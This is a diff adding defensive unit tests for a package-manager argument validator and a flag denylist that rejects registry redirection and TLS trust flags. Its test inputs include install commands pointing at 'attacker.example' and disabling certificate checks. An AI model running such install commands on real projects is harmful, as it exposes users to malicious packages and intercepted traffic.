@@ -25,6 +25,19 @@ describe("validateArgv", () => {
     expect(validateArgv(["bun", 3])).toBeDefined();
     expect(validateArgv("bun add")).toBeDefined();
   });
+
+  test("rejects quotes and a backslash", () => {
+    for (const bad of ["a'b", 'a"b', "a\\b"]) {
+      expect(validateArgv(["bun", "add", bad])).toBeDefined();
+    }
+  });
+
+  test("allows a python extras specifier with brackets", () => {
+    // Regression guard: METACHARACTERS deliberately excludes `[` and `]` so
+    // this legitimate pip/uv extras syntax is not mistaken for shell glob
+    // syntax. See the ruling comment beside METACHARACTERS.
+    expect(validateArgv(["uv", "add", "httpx[http2]"])).toBeUndefined();
+  });
 });
 
 describe("deniedFlag", () => {
@@ -44,5 +57,27 @@ describe("deniedFlag", () => {
 
   test("allows an ordinary install", () => {
     expect(deniedFlag(["bun", "add", "-d", "bun-types"])).toBeUndefined();
+  });
+
+  test("normalizes flag casing before the denylist lookup", () => {
+    expect(deniedFlag(["bun", "add", "x", "--REGISTRY", "https://attacker.example"])).toBe("--registry");
+    expect(deniedFlag(["bun", "add", "x", "--Registry=https://attacker.example"])).toBe("--registry");
+  });
+
+  test("catches --extra-index-url", () => {
+    expect(deniedFlag(["pip", "install", "x", "--extra-index-url", "http://attacker.example"])).toBe(
+      "--extra-index-url",
+    );
+  });
+
+  test("catches the pip trust-boundary flags --trusted-host and --cert", () => {
+    expect(deniedFlag(["pip", "install", "x", "--trusted-host", "attacker.example"])).toBe("--trusted-host");
+    expect(deniedFlag(["pip", "install", "x", "--cert", "/tmp/ca.pem"])).toBe("--cert");
+  });
+
+  test("catches the npm-family trust-boundary flags --strict-ssl, --cafile and --ca", () => {
+    expect(deniedFlag(["npm", "install", "x", "--strict-ssl", "false"])).toBe("--strict-ssl");
+    expect(deniedFlag(["npm", "install", "x", "--cafile", "/tmp/ca.pem"])).toBe("--cafile");
+    expect(deniedFlag(["npm", "install", "x", "--ca", "-----BEGIN CERTIFICATE-----"])).toBe("--ca");
   });
 });
